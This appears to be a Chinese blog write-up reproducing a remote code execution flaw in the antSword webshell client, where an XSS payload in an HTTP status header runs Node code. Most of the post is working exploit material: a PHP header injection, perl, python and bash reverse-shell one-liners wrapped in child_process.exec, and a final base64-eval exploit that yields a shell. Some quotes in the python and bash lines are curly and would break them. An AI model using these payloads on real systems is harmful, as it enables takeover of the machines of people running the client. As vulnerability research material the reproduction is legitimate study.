---
title: RCE Vulnerability in antSword
tags:
  - X(R)S(C)S(E)
categories:
  - 漏洞复现
copyright: true
abbrlink: 4e91690d
date: 2019-04-14 12:42:55
---

![](https://ae01.alicdn.com/kf/HTB18FOoaBGw3KVjSZFwq6zQ2FXa1.jpg)
<!--more-->

前几天蚁剑暴X(R)S(C)S(E)，所以复现看看

```php
<?php
header('HTTP/1.1 500 <img src=# onerror=alert(/AntSword-XSS/)>');
?>
```

![](https://ae01.alicdn.com/kf/HTB15QSiaA9E3KVjSZFG76319XXaR.png)

**弹shell**

写入自己喜欢的弹shell方式到，`exec()`内，然后进行base64加密

perl:

```
require('child_process').exec('perl -e 'use Socket;$i="127.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'',(error, stdout, stderr)=>{
    alert(`stdout: ${stdout}`);
  });
```

python:

```bash
require('child_process').exec('python -c \’import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash”,”-i”]);\’’,(error, stdout, stderr)=>{
    alert(`stdout: ${stdout}`);
  });
```

bash:

```bash
require('child_process').exec('bash -i >& /dev/tcp/127.0.0.1/4444 0>&1’,(error, stdout, stderr)=>{
    alert(`stdout: ${stdout}`);
  });
```


**最终的exp**

```php
<?php
header("HTTP/1.1 406 Not <img src=# onerror='eval(new Buffer(`base64编码内容`,`base64`).toString())'>");
?>
```

nc监听4444，蚁剑添加webshell，双击打开后，成功弹回bash

![0x02.png](https://ae01.alicdn.com/kf/HTB1VN9jaBOD3KVjSZFF763n9pXaL.png)

**PS：**
这里有个坑，就是，用py、bash、nc之类的弹不回shell，用perl就行。不知道怎么回事。后面再研究院研究